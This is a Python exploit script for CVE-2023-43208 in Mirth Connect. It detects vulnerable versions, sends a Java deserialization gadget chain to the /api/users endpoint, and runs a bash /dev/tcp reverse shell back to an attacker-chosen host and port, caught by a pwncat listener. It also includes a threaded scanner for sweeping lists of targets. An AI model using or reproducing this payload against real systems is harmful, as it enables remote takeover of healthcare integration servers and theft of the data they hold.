#!/usr/bin/env python3

import argparse
import requests
import subprocess
import threading
from alive_progress import alive_bar
from rich.console import Console
from concurrent.futures import ThreadPoolExecutor, as_completed

colour = Console()

def ascii_art():
    print("")
    colour.print("[bold bright_green] ██████ ██    ██ ███████       ██████   ██████  ██████  ██████        ██   ██ ██████  ██████   ██████   █████[/bold bright_green]")
    colour.print("[bold bright_green]██      ██    ██ ██                 ██ ██  ████      ██      ██       ██   ██      ██      ██ ██  ████ ██   ██[/bold bright_green]")
    colour.print("[bold bright_green]██      ██    ██ █████   █████  █████  ██ ██ ██  █████   █████  █████ ███████  █████   █████  ██ ██ ██  █████[/bold bright_green]")
    colour.print("[bold bright_green]██       ██  ██  ██            ██      ████  ██ ██           ██            ██      ██ ██      ████  ██ ██   ██[/bold bright_green]")
    colour.print("[bold bright_green] ██████   ████   ███████       ███████  ██████  ███████ ██████             ██ ██████  ███████  ██████   █████[/bold bright_green]")
    print("")
    print("Coded By: K3ysTr0K3R")
    print("")

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

vulnerable_versions = ["4.1.1", "4.3.0", "4.4.0"]
execution_process = '/api/users'
grab_version = '/api/server/version'

headers = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.0; rv:109.0) Gecko/20100101 Firefox/118.0",
    "X-Requested-With": "OpenAPI",
    "Content-Type": "application/xml"
}

def get_shell(lhost, lport):
    listener = subprocess.Popen(['pwncat', '-l', str(lport)])
    listener.wait()

def get_shell_with_bindport(lhost, lport, bindport):
    listener = subprocess.Popen(['pwncat', '-l', str(bindport)])
    listener.wait()

def detect_mirth_connect(target):
    colour.print(f"[bold bright_blue][*][/bold bright_blue] Looking for Mirth Connect instance")
    response = requests.get(target, timeout=10, verify=False)
    if "Mirth Connect Administrator" in response.text:
        colour.print("[bold bright_green][+][/bold bright_green] Found Mirth Connect instance")
    else:
        colour.print("[red][-][/red] Mirth Connect not found")
        exit()

def is_vulnerable_version(response_text):
    for vuln_version in vulnerable_versions:
        if vuln_version in response_text:
            return vuln_version
    return None

def detect_vuln(target):
    detect_mirth_connect(target)
    colour.print("[bold bright_blue][*][/bold bright_blue] Looking for vulnerable Mirth Connect instance")
    try:
        response = requests.get(target + grab_version, headers=headers, timeout=10, verify=False)
        vuln_version = is_vulnerable_version(response.text)
        if vuln_version:
            colour.print(f"[bold bright_green][+][/bold bright_green] Vulnerable Mirth Connect version [bold cyan]{vuln_version}[/bold cyan] instance found at [bold bright_yellow]{target}[/bold bright_yellow]")
        else:
            colour.print("[red][-][/red] No vulnerable version found")
            colour.print("[red][-][/red] Target does not appear to be vulnerable")
    except requests.exceptions.RequestException:
        colour.print("[red][-][/red] Vulnerable version could not be determined")
        colour.print("[bold bright_blue][*][/bold bright_blue] Proceeding with exploit in anyways")
        pass

def exploit(target, lhost, lport):
    detect_vuln(target)
    xml_data = f'''<sorted-set><string>xgpN</string><dynamic-proxy><interface>java.lang.Comparable</interface><handler class="org.apache.commons.lang3.event.EventUtils$EventBindingInvocationHandler"><target class="org.apache.commons.collections4.functors.ChainedTransformer"><iTransformers><org.apache.commons.collections4.functors.ConstantTransformer><iConstant class="java-class">java.lang.Runtime</iConstant></org.apache.commons.collections4.functors.ConstantTransformer><org.apache.commons.collections4.functors.InvokerTransformer><iMethodName>getMethod</iMethodName><iParamTypes><java-class>java.lang.String</java-class><java-class>[Ljava.lang.Class;</java-class></iParamTypes><iArgs><string>getRuntime</string><java-class-array/></iArgs></org.apache.commons.collections4.functors.InvokerTransformer><org.apache.commons.collections4.functors.InvokerTransformer><iMethodName>invoke</iMethodName><iParamTypes><java-class>java.lang.Object</java-class><java-class>[Ljava.lang.Object;</java-class></iParamTypes><iArgs><null/><object-array/></iArgs></org.apache.commons.collections4.functors.InvokerTransformer><org.apache.commons.collections4.functors.InvokerTransformer><iMethodName>exec</iMethodName><iParamTypes><java-class>java.lang.String</java-class></iParamTypes><iArgs><string>sh -c $@|sh . echo bash -c '0&lt;&amp;53-;exec 53&lt;&gt;/dev/tcp/{lhost}/{lport};sh &lt;&amp;53 &gt;&amp;53 2&gt;&amp;53'</string></iArgs></org.apache.commons.collections4.functors.InvokerTransformer></iTransformers></target><methodName>transform</methodName><eventTypes><string>compareTo</string></eventTypes></handler></dynamic-proxy></sorted-set>'''
    try:
        response = requests.get(target + grab_version, headers=headers, timeout=10, verify=False)
        if is_vulnerable_version(response.text):
            colour.print(f"[bold bright_blue][*][/bold bright_blue] Launching exploit against [bold bright_yellow]{target}[/bold bright_yellow]")
            requests.post(target + execution_process, headers=headers, data=xml_data, timeout=20, verify=False)
            colour.print("[bold bright_blue][*][/bold bright_blue] Command shell opened successfully")
    except requests.exceptions.RequestException:
        colour.print(f"[red][-][/red] Exploit failed for [bold bright_yellow]{target}[/bold bright_yellow]")

def shell_opened(target, lhost, lport, bindport=None):
    exploit_thread = threading.Thread(target=exploit, args=(target, lhost, lport))

    if bindport:
        shell_thread = threading.Thread(target=get_shell_with_bindport, args=(lhost, lport, bindport))
    else:
        shell_thread = threading.Thread(target=get_shell, args=(lhost, lport))

    exploit_thread.start()
    shell_thread.start()

    exploit_thread.join()
    shell_thread.join()

def scanner(target):
    try:
        response = requests.get(target + grab_version, headers=headers, timeout=10, verify=False)
        vuln_version = is_vulnerable_version(response.text)
        if vuln_version:
            colour.print(f"[bold bright_green][+][/bold bright_green] Vulnerability Detected | Target: [bold bright_yellow]{target.ljust(22)}[/bold bright_yellow] | Version: [bold cyan]{vuln_version}[/bold cyan]")
    except requests.exceptions.RequestException:
        pass

def scan_from_file(target_file, threads):
    with open(target_file, "r") as url_file:
        urls = [url.strip() for url in url_file]
        if not urls:
            return

        completed_tasks = []
        failed_tasks = []

        with alive_bar(
            len(urls), title="Scanning Targets", bar="smooth", enrich_print=False
        ) as bar:
            with ThreadPoolExecutor(max_workers=threads) as executor:
                future_to_url = {
                    executor.submit(scanner, url): url for url in urls
                }
                for future in as_completed(future_to_url):
                    url = future_to_url[future]
                    try:
                        future.result()
                        completed_tasks.append(url)
                    except Exception:
                        failed_tasks.append((url))
                    bar()

if __name__ == "__main__":
    ascii_art()
    parser = argparse.ArgumentParser(description='A PoC exploit for CVE-2023-43208 - Mirth Connect Remote Code Execution (RCE)')
    parser.add_argument('-u', '--url', dest='url', help='Target URL to exploit', required=False)
    parser.add_argument('-lh', '--lhost', dest='lhost', help='Listening host', required=False)
    parser.add_argument('-lp', '--lport', dest='lport', help='Listening port', required=False)
    parser.add_argument('-bp', '--bindport', dest='bindport', help='Bind port listener (optional)', required=False)
    parser.add_argument('-f', '--file', dest='target_file', help='File containing target URLs to scan', required=False)
    parser.add_argument('-t', '--threads', dest='threads', help='Add the amount of threads to your needs', required=False)
    args = parser.parse_args()

    if args.url and args.lhost and args.lport:
        shell_opened(args.url, args.lhost, args.lport, args.bindport)
    elif args.target_file:
        scan_from_file(args.target_file, int(args.threads or 1))
    else:
        parser.print_help()
